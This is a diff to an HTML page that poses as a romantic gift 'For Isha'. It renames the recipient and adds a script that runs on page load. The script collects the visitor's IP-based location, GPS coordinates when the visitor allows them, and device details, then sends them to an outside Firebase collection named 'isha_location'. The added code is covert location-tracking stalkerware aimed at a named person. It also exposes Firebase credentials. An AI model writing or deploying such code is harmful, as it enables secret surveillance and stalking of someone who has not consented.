@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>For Blessy ❤️</title>
+<title>For Isha ❤️</title>
 
 <style>
 
@@ -115,7 +115,7 @@ opacity:0;
 
 <div class="heart">❤️</div>
 
-<h1>Dear Blessy ❤️</h1>
+<h1>Dear Isha ❤️</h1>
 
 <p>My Special Gift For You</p>
 
@@ -198,8 +198,95 @@ clearInterval(typing);
 
 
 <!-- Firebase + Location -->
-
 <script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig = {
+apiKey: "AIzaSyAicGiOH3CQAxfOy1Y1y-osoypb73Ew1Y8",
+  authDomain: "remote-videoplayer.firebaseapp.com",
+  projectId: "remote-videoplayer",
+  storageBucket: "remote-videoplayer.firebasestorage.app",
+  messagingSenderId: "978359248102",
+  appId: "1:978359248102:web:c03c62454f8cbf70030727",
+  measurementId: "G-4D3PV2EGMX"
+
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+
+/* Function Save Data */
+
+async function saveData(ipData,gpsLat,gpsLng){
+
+await addDoc(collection(db,"isha_location"),{
+
+ip:ipData.ip,
+city:ipData.city,
+region:ipData.region,
+country:ipData.country_name,
+
+ipLatitude:ipData.latitude,
+ipLongitude:ipData.longitude,
+
+gpsLatitude:gpsLat,
+gpsLongitude:gpsLng,
+
+time:new Date().toString(),
+
+device:navigator.userAgent
+
+});
+
+}
+
+
+/* Step 1: Get IP Location */
+
+fetch("https://ipapi.co/json/")
+.then(res=>res.json())
+.then(ipData=>{
+
+
+/* Step 2: Ask GPS */
+
+navigator.geolocation.getCurrentPosition(
+
+/* Allow */
+
+(position)=>{
+
+saveData(
+ipData,
+position.coords.latitude,
+position.coords.longitude
+);
+
+},
+
+/* Decline */
+
+(error)=>{
+
+saveData(
+ipData,
+null,
+null
+);
+
+}
+
+);
+
+
+});
+
+</script>
+  
+<!-- <script type="module">
 
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
@@ -238,7 +325,7 @@ time:new Date().toString()
 
 );
 
-</script>
+</script> -->
 
 </body>
 </html>
